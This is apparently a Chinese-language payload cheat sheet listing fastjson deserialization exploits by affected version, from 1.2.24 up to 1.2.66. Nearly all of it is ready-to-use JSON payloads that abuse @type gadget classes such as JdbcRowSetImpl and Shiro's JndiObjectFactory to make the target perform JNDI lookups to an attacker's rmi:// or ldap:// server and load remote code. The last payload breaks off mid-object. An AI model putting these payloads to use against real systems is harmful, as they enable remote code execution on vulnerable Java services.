# Fastjson 多版本payload集合

影响版本：

### fastjson<=1.2.24

exp：

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1099/jndi", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.41

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.42

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.43

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.45

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1399/Exploit"}}
```

影响版本：

### fastjson<=1.2.47

exp：

```
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://x.x.x.x:1999/Exploit", 
        "autoCommit": true
    }
}
```

影响版本：

### fastjson<=1.2.62

exp：

```
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/exploit"}"
```

影响版本：

### fastjson<=1.2.66

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {
```